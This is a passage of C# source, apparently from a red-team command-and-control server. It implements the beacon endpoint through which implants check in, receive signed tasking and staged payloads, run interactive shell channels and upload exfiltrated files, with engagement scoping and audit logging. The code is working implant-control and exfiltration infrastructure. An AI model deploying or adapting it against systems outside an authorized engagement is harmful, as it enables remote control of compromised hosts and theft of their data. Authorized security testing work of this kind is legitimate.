using System.Collections.Concurrent;
using System.Text;
using Google.Protobuf;
using Grpc.Core;
using Microsoft.AspNetCore.Http;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Live;
using Rod.CoreState.Pki;
using Rod.CoreState.Sessions;
using Rod.CoreState.Tasks;
using Rod.Transport.Channels;
using Rod.V1;
// The domain entity shares its name with System.Threading.Tasks.Task. This file
// uses Rod.CoreState.Tasks for the TaskId/TaskOutcome/TaskService types but never
// the Task entity by name, so pin Task to the BCL type the method signatures need.
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Endpoints;

/// <summary>
/// The implant-initiated beacon stream (, tasking added, exfil
/// capture added under ADR 0004). An implant opens a long-lived reverse
/// connection; the first frame it sends is the handshake
/// (payload = <see cref="HandshakeRequest"/>), and the first frame the server
/// writes back is the <see cref="HandshakeResponse"/>. On a successful handshake
/// the implant opens a session in its engagement and the stream becomes the
/// tasking channel: the server pushes queued tasks (<see cref="TaskRequest"/>)
/// downstream and captures the implant's results (<see cref="TaskResult"/>)
/// upstream, writing each completed task to the audit trail. The same channel
/// also carries <see cref="ExfilChunk"/> frames when an implant streams an
/// artifact off the target; the server reassembles those into the
/// engagement-scoped artifact store. When the stream closes the session stays
/// live -- liveness is last-seen based, and the staleness sweeper is the close
/// path (architecture.md Sec 10.3).
///
/// When a result is captured the stream also publishes a
/// <see cref="LiveEventKind.TaskCompleted"/> event on the live bus, so every connected operator session sees the outcome in real time;
/// the audit write is the durable record, the live event the transient fan-out.
/// The same fan-out is used for exfil captures so a live operator sees an
/// artifact arrive without re-polling the artifact endpoint.
///
/// The stream is also the carrier for the streaming task shape
/// (architecture.md Sec 10.3): a channel task's output arrives as
/// <see cref="ChannelOutput"/> chunks that accumulate onto the task's
/// transcript and fan out live, and the operator's input -- posted over HTTP
/// through the <see cref="Channels.LiveChannelHub"/> -- drains downstream as
/// <see cref="ChannelInput"/> frames from the same dispatch writer that pushes
/// queued tasking.
///
/// mTLS is terminated at Kestrel before this handler runs: the presenting client
/// certificate has already chained to the CA. The application-layer identity
/// check (architecture.md Sec 9) -- that the certificate's
/// <c>(implant_id, engagement_id)</c> binding matches what the handshake
/// advertises and what the implant enrolled with -- happens in
/// <see cref="HandshakeService"/>.
/// </summary>
internal sealed class BeaconEndpoint : Beacon.BeaconBase
{
    private readonly HandshakeService _handshake;
    private readonly ISessionRegistry _sessions;
    private readonly TaskService _tasks;
    private readonly ITaskRepository _taskRecords;
    private readonly IAuditStore _audit;
    private readonly IArtifactStore _artifacts;
    private readonly ILiveEventBus _bus;
    private readonly TimeProvider _clock;
    private readonly IImplantCertificateAuthority _ca;
    private readonly ITaskDispatchWake _wake;
    private readonly LiveChannelHub _channels;

    public BeaconEndpoint(
        HandshakeService handshake,
        ISessionRegistry sessions,
        TaskService tasks,
        ITaskRepository taskRecords,
        IAuditStore audit,
        IArtifactStore artifacts,
        ILiveEventBus bus,
        TimeProvider clock,
        IImplantCertificateAuthority ca,
        ITaskDispatchWake wake,
        LiveChannelHub channels)
    {
        _handshake = handshake;
        _sessions = sessions;
        _tasks = tasks;
        _taskRecords = taskRecords;
        _audit = audit;
        _artifacts = artifacts;
        _bus = bus;
        _clock = clock;
        _ca = ca;
        _wake = wake;
        _channels = channels;
    }

    public override async Task CheckIn(
        IAsyncStreamReader<Frame> requestStream,
        IServerStreamWriter<Frame> responseStream,
        ServerCallContext context)
    {
        var httpContext = context.GetHttpContext();

        // 1. Await the handshake frame. The implant must speak first.
        if (!await requestStream.MoveNext(context.CancellationToken))
            return; // Empty stream; nothing to handshake with.

        var firstFrame = requestStream.Current;
        HandshakeRequest handshakeRequest;
        try
        {
            handshakeRequest = HandshakeRequest.Parser.ParseFrom(firstFrame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            // The first payload was not a recognizable handshake request.
            await WriteHandshakeAsync(responseStream, Response(HandshakeStatus.Unspecified, engagementId: null));
            return;
        }

        // 2. Run the handshake. HandshakeService performs the version check, the
        //    implant lookup, and the mTLS identity check (certificate engagement
        //    == enrolled engagement); refusals come back as HandshakeException.
        var (response, handshake) = await TryHandshakeAsync(httpContext, handshakeRequest);
        await WriteHandshakeAsync(responseStream, response);
        if (response.Status != HandshakeStatus.Ok || handshake is null)
            return;

        var implant = ResolveImplantId(handshakeRequest, httpContext);

        // A genuinely new session is recorded (architecture.md Sec 11). A
        // reused one (a reconnect -- a poll check-in or a flapped stream) is
        // not: the session entity and its SessionOpened record already exist,
        // and a poll cadence must not flood the engagement trail. A handshake
        // is implant-initiated, so the event is attributed to the operator who
        // deployed the implant (handshake.DeployedBy); the payload carries the
        // negotiated protocol version and the outcome the session id.
        if (!handshake.ReusedSession)
        {
            await _audit.AppendAsync(
                AuditEvent.Fact(
                    eventId: Guid.NewGuid(),
                    engagementId: handshake.EngagementId.Value,
                    operatorId: handshake.DeployedBy.Value,
                    implantId: handshake.ImplantId.Value,
                    taskId: Guid.Empty,
                    verb: "handshake",
                    kind: AuditEventKind.SessionOpened,
                    payload: $"{handshakeRequest.Version?.Major ?? 0}.{handshakeRequest.Version?.Minor ?? 0}",
                    output: null,
                    outcome: handshake.SessionId.ToString(),
                    at: handshake.At),
                CancellationToken.None);
        }

        // 3. The session is now live and the stream is the tasking channel. Hold
        //    it open, draining results and pushing queued tasks. The stream
        //    ending does NOT close the session: a session is the implant's live
        //    channel, not one TCP connection -- a poll-mode implant ends every
        //    check-in stream and opens the next seconds later. Liveness is
        //    last-seen based; the staleness sweeper closes the session after the
        //    configured silence threshold, and retirement closes it immediately.
        //    The session context (engagement/implant/operator) is threaded down
        //    so the frame handler can attribute exfil chunks without re-deriving
        //    it from each task record.
        var sessionContext = new SessionContext(
            implant,
            handshake.EngagementId,
            handshake.SessionId,
            handshake.DeployedBy,
            handshakeRequest.Capabilities);
        await RunSessionAsync(sessionContext, requestStream, responseStream, context.CancellationToken);
    }

    // The tasking session: a reader draining result frames and a
    // writer pushing queued tasks downstream, run concurrently. Concurrency is
    // required because tasks enter the queue out-of-band -- an operator POSTs
    // them over HTTP, not over this stream -- so the writer must sit ready on
    // the dispatch wake even while the reader is blocked awaiting the next
    // result. A strictly sequential read-then-dispatch would deadlock: the
    // reader blocks on a result the implant never sends because the task that
    // prompts it is still queued.
    //
    // gRPC allows only one outstanding write per stream; the writer is the sole
    // caller of WriteAsync here, so there is no contention. Either loop ending
    // (clean client close in the reader, cancellation) ends the session; the
    // offline finally above runs regardless.
    private async Task RunSessionAsync(
        SessionContext session,
        IAsyncStreamReader<Frame> requestStream,
        IServerStreamWriter<Frame> responseStream,
        CancellationToken cancellationToken)
    {
        using var linked = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        // Per-stream chunk reassembly buffer. The endpoint is resolved per RPC,
        // so this dictionary lives for the life of one beacon stream; the reader
        // loop is the sole writer, so it needs no extra synchronization.
        var exfil = new ExfilReassembler();
        // Per-stream staged-pull queue: the reader accepts the implant's
        // demands (architecture.md Sec 10, the typed arm) and the writer --
        // the stream's sole WriteAsync caller -- streams the demanded bytes
        // downstream. The dispatch wake doubles as the handoff: a demand
        // releases the implant's wake, so the parked writer wakes and drains.
        var pulls = new ConcurrentQueue<Guid>();
        // The stream's channel sink (architecture.md Sec 10.3, the streaming
        // task shape): the operator input route enqueues onto it over HTTP and
        // the writer drains it downstream as ChannelInput frames. Registered
        // in the hub for the implant's lifetime of this stream; the using
        // detaches it on stream end, leaving a newer stream's registration
        // alone.
        var inputs = new BeaconChannelSink(_wake, session.Implant);
        using var attached = _channels.Attach(session.Implant, inputs);
        // Channel output chunks may split a UTF-8 code point across frames;
        // the decoder keeps the partial bytes and completes them on the next
        // chunk so the transcript decodes what the channel actually printed.
        var decoders = new ChannelDecoders();
        var reader = ReadResultsAsync(session, requestStream, exfil, pulls, decoders, linked);
        var writer = DispatchTasksAsync(session, pulls, inputs, responseStream, linked.Token);

        // Whichever finishes first cancels the other. The writer only ever ends
        // via cancellation (its loop runs for the session), so swallow the
        // cancellation that follows; other exceptions surface and are rethrown.
        await await Task.WhenAny(reader, writer);
        linked.Cancel();
        try
        {
            await Task.WhenAll(reader, writer);
        }
        catch (OperationCanceledException)
        {
            // Expected: the cancelled loop unwinds through the wake wait.
        }
    }

    // Reader: await each upstream frame, capture it into the task and append the
    // audit event, or -- when the frame is an ExfilChunk -- reassemble and store
    // the artifact. Each frame also advances the session's last-seen stamp, so
    // the presence roster reflects real activity, not just stream open/close.
    // Ends on a clean client close (MoveNext returns false); throws on an abort.
    private async Task ReadResultsAsync(
        SessionContext session,
        IAsyncStreamReader<Frame> requestStream,
        ExfilReassembler exfil,
        ConcurrentQueue<Guid> stagedPulls,
        ChannelDecoders decoders,
        CancellationTokenSource linked)
    {
        var cancellationToken = linked.Token;
        while (await requestStream.MoveNext(cancellationToken))
        {
            await _sessions.TouchAsync(
                session.Implant, session.Capabilities, _clock.GetUtcNow(), cancellationToken);

            // The session may have been closed out from under this stream -- the
            // staleness sweep, or a reconnect that opened a newer session for the
            // implant. TouchAsync is a no-op then, so every later frame would
            // keep refreshing a session this stream no longer holds; end the
            // stream instead so the implant reconnects and re-handshakes (its
            // beacon loop treats a dropped stream as a normal reconnect).
            var active = await _sessions.GetActiveAsync(session.Implant, cancellationToken);
            if (active is null || active.Id != session.SessionId)
            {
                linked.Cancel();
                return;
            }

            await HandleFrameAsync(session, requestStream.Current, exfil, stagedPulls, decoders, cancellationToken);
        }
    }

    // Writer: push queued tasks downstream the moment they are queued, and
    // stream staged payloads the moment they are demanded. Operators task
    // implants over HTTP at any moment, so this loops for the life of the
    // session rather than draining once. Each iteration claims first --
    // covering tasks queued before the stream opened and dispatches returned
    // to the queue by a failed write -- drains any staged pulls the reader
    // accepted, then parks on the per-implant dispatch wake, which TaskService
    // releases on every accepted enqueue and the reader releases on every
    // demand. No poll: a queued task is pushed on release, and an idle stream
    // claims nothing (architecture.md Sec 10.3).
    private async Task DispatchTasksAsync(
        SessionContext session,
        ConcurrentQueue<Guid> stagedPulls,
        BeaconChannelSink inputs,
        IServerStreamWriter<Frame> responseStream,
        CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            await DispatchNextAsync(session.Implant, responseStream, cancellationToken);
            await StreamStagedPullsAsync(session, stagedPulls, responseStream, cancellationToken);
            await StreamChannelInputsAsync(inputs, responseStream, cancellationToken);
            await _wake.WaitAsync(session.Implant, cancellationToken);
        }
    }

    // Drains the operator input the route queued onto this stream's sink, one
    // ChannelInput frame per unit (architecture.md Sec 10.3): the streaming
    // counterpart of DispatchNextAsync. The route validated the task before
    // enqueueing; this is pure transport -- frame the bytes and write them to
    // the implant that runs the channel.
    private static async Task StreamChannelInputsAsync(
        BeaconChannelSink inputs,
        IServerStreamWriter<Frame> responseStream,
        CancellationToken cancellationToken)
    {
        while (inputs.TryDequeue(out var unit))
        {
            var input = new ChannelInput
            {
                TaskId = new TaskId(unit.TaskId).ToString(),
                Eof = unit.Eof,
            };
            if (unit.Data.Length > 0)
                input.Data = ByteString.CopyFrom(unit.Data);
            await responseStream.WriteAsync(
                new Frame
                {
                    Payload = ByteString.CopyFrom(input.ToByteArray()),
                    Kind = FrameKind.ChannelInput,
                },
                cancellationToken);
        }
    }

    // Pulls the next queued task for the implant and writes it as a TaskRequest
    // downstream. A no-op write when nothing is queued.
    private async Task DispatchNextAsync(
        ImplantId implant,
        IServerStreamWriter<Frame> responseStream,
        CancellationToken cancellationToken)
    {
        var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken);
        if (dispatched is null)
            return;

        var request = new TaskRequest
        {
            TaskId = dispatched.TaskId.ToString(),
            Verb = dispatched.Verb,
            Arguments = dispatched.Arguments,
        };
        // The typed arm's marker (architecture.md Sec 10): a staged task tells
        // the implant its payload is server-side and demanded, not inline. The
        // sha256 token inside the signed arguments stays the integrity
        // authority; the marker only switches the implant's grammar.
        if (dispatched.StagedBytes is { } stagedBytes)
            request.StagedBytes = (ulong)stagedBytes;
        // Command signing (architecture.md Sec 9): the CA key signs the task's
        // canonical (implant_id, task_id, verb, arguments) tuple -- the implant
        // id binds the task to its intended executor -- and the implant
        // verifies against the CA it already trusts before executing, so a
        // compromised transport or stager cannot inject, alter, or replay
        // tasking across implants even where the mTLS channel does not reach
        // (a redirector's inner hop).
        request.Signature = ByteString.CopyFrom(
            _ca.SignTasking(dispatched.ImplantId.ToString(), request.TaskId, request.Verb, request.Arguments));
        var frame = new Frame { Payload = ByteString.CopyFrom(request.ToByteArray()) };

        // Write downstream first: the dispatch audit records a task the implant
        // actually received. When the write fails, the task returns to the queue
        // so a later check-in redelivers it -- a task whose frame never left
        // must not strand in Dispatched (architecture.md Sec 10.3).
        try
        {
            await responseStream.WriteAsync(frame);
        }
        catch
        {
            await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
            throw;
        }

        // The dispatch is recorded (architecture.md Sec 11). Dispatch
        // is server-driven (the implant pulls the queue), so the event is
        // attributed to the operator whose tasking it carries out. The payload is
        // the verb/arguments and the outcome the dispatched task id -- a task's
        // full attributed arc is TaskIssued -> TaskDispatched -> TaskCompleted.
        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: dispatched.EngagementId.Value,
                operatorId: dispatched.IssuedBy.Value,
                implantId: dispatched.ImplantId.Value,
                taskId: dispatched.TaskId.Value,
                verb: dispatched.Verb,
                kind: AuditEventKind.TaskDispatched,
                payload: dispatched.Arguments,
                output: null,
                outcome: dispatched.TaskId.ToString(),
                at: dispatched.DispatchedAt),
            cancellationToken);
    }

    // An upstream frame: dispatch on its kind. TASK_RESULT (and the legacy
    // UNSPECIFIED default, which older implants still send) takes the
    // capture-and-audit path; EXFIL_CHUNK reassembles a streamed artifact into
    // the artifact store; STAGED_PULL hands the implant's demand for a staged
    // payload to the writer; CHANNEL_OUTPUT appends a streaming task's chunk
    // onto its transcript. Non-result, non-exfil frames are ignored for now
    // (keepalives, etc.). This is the transport-layer composition the AC
    // calls for -- task state lives in core, the audit event in the audit
    // layer, and the beacon stream is where both meet on a completed task
    // (architecture.md Sec 10.3/11).
    private async Task HandleFrameAsync(
        SessionContext session,
        Frame frame,
        ExfilReassembler exfil,
        ConcurrentQueue<Guid> stagedPulls,
        ChannelDecoders decoders,
        CancellationToken cancellationToken)
    {
        switch (frame.Kind)
        {
            case FrameKind.ExfilChunk:
                await HandleExfilChunkAsync(session, frame, exfil, cancellationToken);
                return;
            case FrameKind.StagedPull:
                await HandleStagedPullAsync(session, frame, stagedPulls, cancellationToken);
                return;
            case FrameKind.ChannelOutput:
                await HandleChannelOutputAsync(session, frame, decoders, cancellationToken);
                return;
            case FrameKind.TaskResult:
            case FrameKind.Unspecified:
            default:
                await HandleTaskResultAsync(frame, cancellationToken);
                return;
        }
    }

    // A ChannelOutput frame (architecture.md Sec 10.3, the streaming task
    // shape): one chunk of a live channel's output. The task must belong to
    // this stream's implant and engagement -- an implant cannot stream onto
    // another's tasks -- and must still be Dispatched; a straggler after the
    // final TaskResult (a retransmission, a race at close) carries nothing
    // new and is ignored rather than tearing the session down. The decoded
    // chunk lands on the task's transcript and fans out live so a connected
    // operator reads the channel as it prints.
    private async Task HandleChannelOutputAsync(
        SessionContext session,
        Frame frame,
        ChannelDecoders decoders,
        CancellationToken cancellationToken)
    {
        ChannelOutput output;
        try
        {
            output = ChannelOutput.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return; // Malformed chunk; ignore rather than tearing down the stream.
        }

        if (!TaskId.TryParse(output.TaskId, out var taskId))
            return;

        var task = await _taskRecords.FindAsync(taskId, cancellationToken);
        if (task is null || task.ImplantId != session.Implant || task.EngagementId != session.EngagementId)
            return;

        // An empty chunk is a legal heartbeat on some channel implementations;
        // nothing to append.
        if (output.Data.Length == 0)
            return;

        var text = decoders.Decode(taskId.Value, output.Data.Span);

        TaskAppended appended;
        try
        {
            appended = await _tasks.AppendChannelOutputAsync(taskId, text, cancellationToken);
        }
        catch (InvalidOperationException)
        {
            return;
        }

        // The audit trail needs no per-chunk event: the transcript is the
        // task's own record and lands whole in its TaskCompleted event. The
        // live event is the transient projection -- connected operators read
        // the channel as it prints, without re-polling the task.
        await _bus.PublishAsync(
            LiveEvent.ChannelOutput(
                appended.EngagementId,
                appended.IssuedBy,
                appended.ImplantId,
                appended.TaskId,
                text,
                _clock.GetUtcNow()),
            cancellationToken);
    }

    // A StagedPull frame: the implant demands a staged task's payload
    // (architecture.md Sec 10). Validated against the stream's own implant --
    // a demand naming another implant's task is dropped, not answered -- then
    // queued for the writer and the wake released so the demand is answered
    // immediately. The task's own lifecycle is untouched: the demand is a
    // transport read of staged bytes, not a task transition.
    private async Task HandleStagedPullAsync(
        SessionContext session,
        Frame frame,
        ConcurrentQueue<Guid> stagedPulls,
        CancellationToken cancellationToken)
    {
        StagedPull pull;
        try
        {
            pull = StagedPull.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return;
        }

        if (!TaskId.TryParse(pull.TaskId, out var taskId))
            return;

        var task = await _taskRecords.FindAsync(taskId, cancellationToken);
        if (task is null || task.ImplantId != session.Implant || task.StagedBytes is null)
            return;

        stagedPulls.Enqueue(task.Id.Value);
        _wake.Release(session.Implant);
    }

    // Streams every demanded staged payload downstream, one StagedChunk run
    // per demand: the task-bound artifact the issuer staged, sliced at the
    // frame-budget chunk size, 0-origin sequences, terminal on the last chunk.
    // A demand whose staged bytes are gone (an expired store, a restart that
    // lost the in-memory artifacts) is answered with a single empty terminal
    // chunk so the implant resolves and fails the hash check honestly rather
    // than waiting on chunks that will never come.
    private async Task StreamStagedPullsAsync(
        SessionContext session,
        ConcurrentQueue<Guid> stagedPulls,
        IServerStreamWriter<Frame> responseStream,
        CancellationToken cancellationToken)
    {
        while (stagedPulls.TryDequeue(out var taskIdValue))
        {
            var staged = (await _artifacts.ForTaskAsync(taskIdValue, cancellationToken))
                .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(taskIdValue));
            var content = staged?.Content ?? Array.Empty<byte>();

            for (var offset = 0; ; offset += StagedChunkSize)
            {
                var end = Math.Min(offset + StagedChunkSize, content.Length);
                var slice = new byte[end - offset];
                Array.Copy(content, offset, slice, 0, slice.Length);
                var chunk = new StagedChunk
                {
                    TaskId = new TaskId(taskIdValue).ToString(),
                    Sequence = (ulong)(offset / StagedChunkSize),
                    Terminal = end == content.Length,
                    Data = ByteString.CopyFrom(slice),
                };
                await responseStream.WriteAsync(
                    new Frame { Payload = ByteString.CopyFrom(chunk.ToByteArray()) },
                    cancellationToken);
                if (chunk.Terminal)
                    break;
            }
        }
    }

    // The downstream chunk size for staged payloads: the same budget the
    // implant's exfil chunker honors, so a marshaled Frame fits the message
    // cap with protobuf overhead to spare in both directions.
    private const int StagedChunkSize = 512 * 1024;

    // A TaskResult frame: capture the outcome into the task and append the audit
    // event, then fan the completion out to connected operators. Pre-dates the
    // FrameKind discriminator: UNSPECIFIED frames fall through here too so older
    // implants keep working.
    private async Task HandleTaskResultAsync(Frame frame, CancellationToken cancellationToken)
    {
        TaskResult result;
        try
        {
            result = TaskResult.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return; // Not a result frame; ignore for now (keepalives, etc.).
        }

        if (!TaskId.TryParse(result.TaskId, out var taskId))
            return;

        // Map the wire outcome onto the core-state enum (RecordResultAsync takes
        // the core type). Both namespaces define TaskOutcome; qualify both sides.
        var outcome = result.Outcome switch
        {
            Rod.V1.TaskOutcome.Succeeded => Rod.CoreState.Tasks.TaskOutcome.Succeeded,
            Rod.V1.TaskOutcome.Failed => Rod.CoreState.Tasks.TaskOutcome.Failed,
            _ => Rod.CoreState.Tasks.TaskOutcome.Failed,
        };

        TaskCompleted completed;
        try
        {
            completed = await _tasks.RecordResultAsync(taskId, result.Output, outcome, cancellationToken);
        }
        catch (InvalidOperationException)
        {
            // An unknown task id or a retransmitted result after a reconnect
            // (the task is no longer Dispatched). Ignore the frame rather than
            // tearing the session down: the result for this id is either already
            // recorded or belongs to someone else.
            return;
        }

        // The store stamps the chain hashes on append; the call site supplies only
        // the audited facts (AuditEvent.Fact leaves PreviousHash/Hash empty).
        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: completed.EngagementId.Value,
                operatorId: completed.IssuedBy.Value,
                implantId: completed.ImplantId.Value,
                taskId: completed.TaskId.Value,
                verb: completed.Verb,
                kind: AuditEventKind.TaskCompleted,
                payload: completed.Arguments,
                output: completed.Output,
                outcome: completed.Outcome.ToString(),
                at: completed.CompletedAt),
            cancellationToken);

        // Fan the completion out to connected operator sessions.
        // The audit write above is the durable record; this live event is the
        // transient projection operators read while connected, so they see the
        // outcome without re-polling the task endpoint.
        await _bus.PublishAsync(
            LiveEvent.TaskCompleted(
                completed.EngagementId,
                completed.IssuedBy,
                completed.ImplantId,
                completed.TaskId,
                payload: $"{completed.Outcome}: {completed.Output}",
                completed.CompletedAt),
            cancellationToken);
    }

    // An ExfilChunk frame: buffer it in the per-stream reassembler keyed by
    // (task id, artifact name); on the terminal chunk, build the artifact,
    // save it scoped to the engagement, and append an ExfilCaptured audit
    // event. The artifact is bound to the task that triggered the push (the
    // implant stamps the task id on each chunk before sending), so it lands in
    // the same engagement-scoped store as operator-attached artifacts.
    private async Task HandleExfilChunkAsync(
        SessionContext session,
        Frame frame,
        ExfilReassembler exfil,
        CancellationToken cancellationToken)
    {
        ExfilChunk chunk;
        try
        {
            chunk = ExfilChunk.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return; // Malformed chunk; ignore rather than tearing down the stream.
        }

        if (!Guid.TryParse(chunk.TaskId, out var taskId))
            return;

        if (exfil.Append(taskId, chunk, out var reassembled) != ExfilAppendResult.Completed)
            return;

        // The terminal chunk closes the stream. Before materializing an artifact,
        // verify the task the implant stamped really belongs to this session's
        // implant and engagement -- otherwise an implant could attach evidence to
        // another engagement's task ids.
        var task = await _taskRecords.FindAsync(new TaskId(taskId), cancellationToken);
        if (task is null || task.ImplantId != session.Implant || task.EngagementId != session.EngagementId)
            return;

        // Build the artifact from the reassembled bytes, save it scoped to the
        // engagement and bound to the task, and record the capture in the audit
        // trail.
        var artifactId = Guid.NewGuid();
        var now = _clock.GetUtcNow();
        var artifact = new Artifact(
            ArtifactId: artifactId,
            EngagementId: session.EngagementId.Value,
            TaskId: taskId,
            OperatorId: session.OperatorId.Value,
            Name: reassembled.Name,
            ContentType: reassembled.ContentType,
            Content: reassembled.Data,
            Size: reassembled.Data.Length,
            StoredAt: now);

        await _artifacts.SaveAsync(artifact, cancellationToken);

        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: session.EngagementId.Value,
                operatorId: session.OperatorId.Value,
                implantId: session.Implant.Value,
                taskId: taskId,
                verb: "exfil.push",
                kind: AuditEventKind.ExfilCaptured,
                payload: $"{artifact.Name};{artifact.ContentType}",
                output: null,
                outcome: artifactId.ToString("N"),
                at: now),
            cancellationToken);

        // Fan the capture out to connected operator sessions so a live operator
        // sees the artifact arrive without re-polling the artifact endpoint.
        await _bus.PublishAsync(
            LiveEvent.TaskCompleted(
                session.EngagementId,
                session.OperatorId,
                session.Implant,
                new TaskId(taskId),
                payload: $"exfil: {artifact.Name};{artifact.ContentType}",
                now),
            cancellationToken);
    }

    private async Task<(HandshakeResponse Response, HandshakeResult? Handshake)> TryHandshakeAsync(
        HttpContext httpContext,
        HandshakeRequest request)
    {
        // The certificate identity is authoritative (read off the mTLS-presented
        // cert), not the wire -- an implant cannot name another engagement by
        // editing its handshake. The implant id from the cert is what we look up.
        var certIdentity = ClientCertificateIdentity.Read(httpContext);

        try
        {
            var result = await _handshake.HandshakeAsync(
                new HandshakeCommand(
                    ImplantId: certIdentity?.ImplantId
                        ?? ParseImplantId(request.ImplantId)
                        ?? default,
                    MajorVersion: request.Version?.Major ?? -1,
                    MinorVersion: request.Version?.Minor ?? -1,
                    Capabilities: request.Capabilities,
                    CertificateEngagementId: certIdentity?.EngagementId),
                CancellationToken.None);

            // The full result is returned (not just the session id) so CheckIn can
            // compose the SessionOpened audit write from it -- a handshake is
            // implant-initiated, so the event is attributed to the implant's
            // DeployedBy and needs the engagement/implant/session ids the result
            // carries (architecture.md Sec 11).
            return (Response(HandshakeStatus.Ok, result.EngagementId.ToString()), result);
        }
        catch (HandshakeException ex)
        {
            var status = ex.Reason switch
            {
                HandshakeReason.UnknownImplant => HandshakeStatus.UnknownImplant,
                HandshakeReason.VersionMismatch => HandshakeStatus.VersionMismatch,
                HandshakeReason.IdentityMismatch => HandshakeStatus.IdentityMismatch,
                HandshakeReason.KillDateExpired => HandshakeStatus.KillDateExpired,
                HandshakeReason.ImplantRetired => HandshakeStatus.ImplantRetired,
                _ => HandshakeStatus.Unspecified,
            };
            return (Response(status, engagementId: null), Handshake: null);
        }
    }

    // The implant id resolved off the handshake/certificate. Prefer the
    // certificate binding (authoritative); fall back to the handshake field only
    // when no certificate was presented.
    private static ImplantId ResolveImplantId(HandshakeRequest request, HttpContext httpContext)
        => ClientCertificateIdentity.Read(httpContext)?.ImplantId
           ?? ParseImplantId(request.ImplantId)
           ?? default;

    private static ImplantId? ParseImplantId(string? text)
        => ImplantId.TryParse(text, out var id) ? id : null;

    private static HandshakeResponse Response(HandshakeStatus status, string? engagementId)
        => new()
        {
            Status = status,
            Version = new ProtocolVersion { Major = ProtocolVersions.Major, Minor = ProtocolVersions.Minor },
            EngagementId = engagementId ?? string.Empty,
        };

    private static Task WriteHandshakeAsync(IServerStreamWriter<Frame> stream, HandshakeResponse response)
    {
        var frame = new Frame { Payload = ByteString.CopyFrom(response.ToByteArray()) };
        return stream.WriteAsync(frame);
    }

    // The identity context threaded from CheckIn down to the frame handler. The
    // handshake resolves it once; passing it as a single value keeps the handler
    // signatures short and avoids re-deriving engagement/operator from each task
    // record (exfil chunks carry a task id but the operator who deployed the
    // implant is not on the task the way it is on TaskCompleted). Capabilities
    // are the advertised verb set, re-passed to each session touch so the
    // last-seen refresh never clobbers the handshake advertisement.
    private sealed record SessionContext(
        ImplantId Implant,
        EngagementId EngagementId,
        SessionId SessionId,
        OperatorId OperatorId,
        IReadOnlyCollection<string> Capabilities);

    // Reassembles ExfilChunk frames into a single byte buffer keyed by
    // (task id, artifact name). The beacon reader loop is the sole writer, so a
    // plain Dictionary is safe here without extra locking; the per-RPC lifetime
    // (the endpoint is resolved per stream) keeps incomplete buffers from one
    // session leaking into another. A terminal chunk flushes the buffer and
    // reports the reassembled bytes back to the caller.
    //
    // The reassembly bounds are a memory-DoS guard, not an input-validation
    // convenience: the stream carries an authenticated implant, but the total
    // bytes of an exfil stream are whatever that implant claims, so an
    // unbounded reassembler would let one implant pin process memory. Chunks
    // must arrive in sequence; a gap, a repeat, a cap overflow, or an
    // oversized declaration drops the chunk and evicts its stream, so a
    // misbehaving stream cannot accumulate.
    private sealed class ExfilReassembler
    {
        // One artifact (name, content type) and one stream total a beacon
        // session can have open at once; a stream over these bounds is dropped
        // whole. The per-stream byte cap matches the operator attach cap, so
        // both evidence paths share one ceiling.
        private const int MaxNameBytes = 256;
        private const int MaxContentTypeBytes = 128;
        private const int MaxStreamBytes = 64 * 1024 * 1024;
        private const int MaxOpenStreams = 16;

        private readonly Dictionary<Key, Buffer> _buffers = new();

        public ExfilAppendResult Append(Guid taskId, ExfilChunk chunk, out Reassembled reassembled)
        {
            reassembled = default;

            if (chunk.Name.Length == 0 || chunk.Name.Length > MaxNameBytes
                || chunk.ContentType.Length > MaxContentTypeBytes
                || chunk.Data.Length == 0)
            {
                return ExfilAppendResult.Dropped;
            }

            var key = new Key(taskId, chunk.Name);
            if (!_buffers.TryGetValue(key, out var buffer))
            {
                if (_buffers.Count >= MaxOpenStreams)
                    return ExfilAppendResult.Dropped;

                buffer = new Buffer(chunk.Name, chunk.ContentType);
                _buffers[key] = buffer;
            }

            // Sequence discipline: the first chunk starts the stream at 0 or 1
            // (both origins have shipped; accept either), every later chunk must
            // be exactly the next index. Anything else drops the stream so a
            // repeated or reordered send cannot corrupt the artifact.
            if (buffer.NextSequence is { } next)
            {
                if (chunk.Sequence != next)
                {
                    _buffers.Remove(key);
                    return ExfilAppendResult.Dropped;
                }
            }
            else if (chunk.Sequence != 0 && chunk.Sequence != 1)
            {
                _buffers.Remove(key);
                return ExfilAppendResult.Dropped;
            }

            if (buffer.Data.Count + chunk.Data.Length > MaxStreamBytes)
            {
                _buffers.Remove(key);
                return ExfilAppendResult.Dropped;
            }

            buffer.NextSequence = chunk.Sequence + 1;
            buffer.Data.AddRange(chunk.Data);

            if (!chunk.Terminal)
                return ExfilAppendResult.Buffered;

            _buffers.Remove(key);
            reassembled = new Reassembled(buffer.Name, buffer.ContentType, buffer.Data.ToArray());
            return ExfilAppendResult.Completed;
        }

        private readonly record struct Key(Guid TaskId, string Name);

        private sealed class Buffer(string name, string contentType)
        {
            public string Name { get; } = name;
            public string ContentType { get; } = contentType;
            public List<byte> Data { get; } = new();
            public ulong? NextSequence { get; set; }
        }
    }

    // What Append did with a chunk: buffered into its stream, completed a
    // stream (terminal, reassembled payload available), or dropped it.
    private enum ExfilAppendResult
    {
        Buffered,
        Completed,
        Dropped,
    }

    // The reassembled artifact payload handed back from the ExfilReassembler on
    // a terminal chunk: the name and content type the implant declared plus the
    // concatenated bytes of every chunk in the stream.
    private readonly record struct Reassembled(string Name, string ContentType, byte[] Data);

    // Incremental UTF-8 decoding for channel output, one decoder per task id.
    // A channel may emit a chunk that splits a multi-byte code point across
    // frames -- the shell does not frame on character boundaries -- and a
